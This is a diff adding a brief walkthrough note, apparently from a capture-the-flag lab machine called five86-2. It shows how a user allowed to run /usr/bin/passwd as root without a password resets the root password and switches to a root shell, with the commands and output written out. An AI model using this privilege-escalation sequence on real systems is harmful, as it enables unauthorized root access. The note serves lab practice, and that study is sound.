@@ -1,0 +1,26 @@
+after running sudo -l and seeing that /usr/bin/passwd is allowed as either a user or root you can enter the following:
+
+
+$ sudo -l
+sudo -l
+Matching Defaults entries for peter on five86-2:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User peter may run the following commands on five86-2:
+    (ALL : ALL) ALL
+    (root) NOPASSWD: /usr/bin/passwd
+$ sudo /usr/bin/passwd root
+sudo /usr/bin/passwd root
+New password: rootedbot
+
+Retype new password: rootedbot
+
+passwd: password updated successfully
+$ su root
+su root
+Password: rootedbot
+
+root@five86-2:/# cd /root
+
+this one is pretty straight forward
